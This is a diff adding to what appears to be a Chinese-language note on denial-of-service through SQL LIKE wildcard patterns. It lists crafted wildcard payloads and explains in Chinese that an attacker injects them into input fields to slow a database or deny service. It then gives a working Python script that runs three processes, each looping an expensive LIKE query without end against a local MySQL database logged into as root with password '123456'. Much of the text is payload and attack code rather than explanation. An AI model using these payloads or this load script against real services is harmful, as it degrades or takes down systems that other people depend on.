@@ -140,3 +140,53 @@ SELECT * FROM test.user where username like '%_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 _[r/a)_ _(r/b)_ _(rd)_
 %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
 %_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
+
+当攻击者注入%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n] !% payload 到输入字段，数据库解析查询并尝试匹配通配符指定的模式。
+
+在这种情况下，查询会尝试匹配以“n”开头的任何字符串，后跟除“n”之外的任何字符，然后是“y”，再后跟除“j”之外的任何字符，依此类推。
+
+如果数据库有大量记录，查询可能需要很长时间才能执行，从而导致响应时间变慢或完全拒绝服务。攻击者还可以修改有效负载以针对特定的数据库表，从而使攻击更加有效。
+
+
+
+from faker import Faker
+import pymysql.cursors
+from multiprocessing import Process
+def task():
+    with connection:
+        # while True:
+        #     with connection.cursor() as cursor:
+        #         # Create a new record
+        #         sql = "INSERT INTO `user` (`username`, `password`) VALUES (%s, %s)"
+        #         cursor.execute(sql, (faker.name(), faker.password()))
+        #
+        #     # connection is not autocommit by default. So you must commit to save
+        #     # your changes.
+        #     connection.commit()
+
+        with connection.cursor() as cursor:
+            # Read a single record
+            while True:
+                sql = "SELECT * FROM `user` WHERE `username` LIKE '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%e'"
+                cursor.execute(sql)
+                result = cursor.fetchall()
+                print(result)
+
+faker = Faker()
+
+# Connect to the database
+connection = pymysql.connect(host='localhost',
+                             user='root',
+                             password='123456',
+                             database='test',
+                             cursorclass=pymysql.cursors.DictCursor)
+
+if __name__ == '__main__':
+    proc1 = Process(target=task)
+    proc1.start()
+
+    proc1 = Process(target=task)
+    proc1.start()
+
+    proc1 = Process(target=task)
+    proc1.start()
